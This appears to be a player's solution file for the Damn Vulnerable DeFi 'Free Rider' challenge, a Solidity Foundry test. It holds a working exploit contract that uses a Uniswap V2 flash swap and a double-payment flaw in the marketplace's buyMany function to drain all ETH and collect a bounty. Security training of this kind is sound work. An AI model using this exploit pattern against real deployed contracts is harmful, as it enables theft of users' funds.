// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        /* The attack is simply, the marketplace lacks the check when a user buys the same NFT multiple times using buyMany function,
        the first time the user buys the NFT it will be transferred to the user and the eth will be transferred to the owner of the NFT,
        the second time since the attacker is the owner, the marketplace will transfer the attacker eth. This can repeat mult times
        until the attacker has all the eth of the marketplace. Basically we can buy multiple tokens with the same eth.

        We lack the initial 15 eth to buy the first NFT, so we need to get it from the uniswap pair, we can do this by calling the swap function
        of the uniswap router, we need to make a smart contract that has a function uniswapV2Call that will be called by the uniswap pair when we call the swap function
        */
        attack attackContract =
            new attack{value: PLAYER_INITIAL_ETH_BALANCE}(uniswapPair, marketplace, nft, recoveryManager, weth);
        attackContract.initiateAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

contract attack {
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    WETH weth;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager,
        WETH _weth
    ) payable {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        weth = _weth;
    }

    function initiateAttack() public {
        // we need to get 15 eth to buy the first NFT
        // The last parameter is the data that will be passed to the uniswapV2Call function, it should not be empty
        // 0 dvt, 1 weth
        // we make a flash swap to get 15 eth, we will need to pay it back with fee
        // the first amount is the weth token, the second amount is the dvt token
        uniswapPair.swap(15 ether, 0, address(this), "ATTACK");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // first we convert the weth to eth
        weth.withdraw(amount0);

        // there are 6 nfts with id 0 to 5
        // there is 90 eth in the marketplace which we will drain (6*15 = 90)
        uint256[] memory tokenIds = new uint256[](6);
        uint256 nftValue = 15 ether;

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: nftValue}(tokenIds); // new uint256[](6) is equivalent to [0, 0, 0, 0, 0, 0]
        // we buy the first nft 6 times to drain the marketplace

        console.log("Marketplace balance: %s", address(marketplace).balance);
        console.log("Our balance: %s", address(this).balance);

        // now we have 90 eth
        // lets first pay back the 15 eth we borrowed with fee
        // the fee is calculated as amount1 * 3 / 997 (0.3%) we will round up with 1
        uint256 fee = nftValue * 3 / 997 + 1;
        uint256 amountToPay = 15 ether + fee;
        // convert eth to weth and transfer to uniswap pair
        weth.deposit{value: amountToPay}();
        weth.transfer(address(uniswapPair), amountToPay);

        // now we transfer all the nft to the recovery manager
        for (uint256 i = 0; i < 6; i++) {
            if (i != 5) {
                nft.safeTransferFrom(address(this), address(recoveryManager), i);
            } else {
                address payable player = payable(tx.origin);
                nft.safeTransferFrom(address(this), address(recoveryManager), 5, abi.encode(player));
            }
        }

        // send the player all the eth
        payable(tx.origin).transfer(address(this).balance);
    }

    // since the NFTMarketplace uses nft.safeTransferFrom, we need to implement this function
    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // to receive eth from the nft marketplace
    receive() external payable {}
}
